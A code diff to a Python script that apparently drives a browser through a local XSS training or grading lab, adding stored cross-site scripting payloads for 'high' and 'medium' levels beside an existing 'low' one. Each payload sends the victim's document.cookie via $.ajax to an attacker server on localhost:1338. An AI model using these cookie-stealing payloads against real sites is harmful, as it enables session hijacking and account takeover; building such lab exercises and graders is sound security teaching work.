@@ -36,12 +36,19 @@ def xss(vuln_type, level):
 
     # Stored XSS
     print(level)
-    if vuln_type == '2' and level == 'low':
+    if vuln_type == '2' and level == 'high':
+        print("I AM HERE!!!!")
+        url = 'http://localhost:1337/xss/2/high?comment=<body onload=$.ajax({url:"http://localhost:1338/xss/stored_high?cookie=".concat(document.cookie)});></body>'
+        driver.get(url)
+
+    elif vuln_type == '2' and level == 'low':
         url = "http://localhost:1337/xss/2/low?comment=%22%3Cscript%3E$.ajax({url:%22http://localhost:1338/xss/stored_low?cookie=%22.concat(document.cookie)});%3C/script%3E%22"
         driver.get(url)
-    elif vuln_type == '2' and level == 'medium':
-        pass
 
+    elif vuln_type == '2' and level == 'medium':
+        url = 'http://localhost:1337/xss/2/high?comment=<body onload=$.ajax({url:"http://localhost:1338/xss/stored_high?cookie=".concat(document.cookie)});></body>'
+        # driver.get(url)
+        pass
 
     # Grader verification should be done in attacker_server/server.py
 
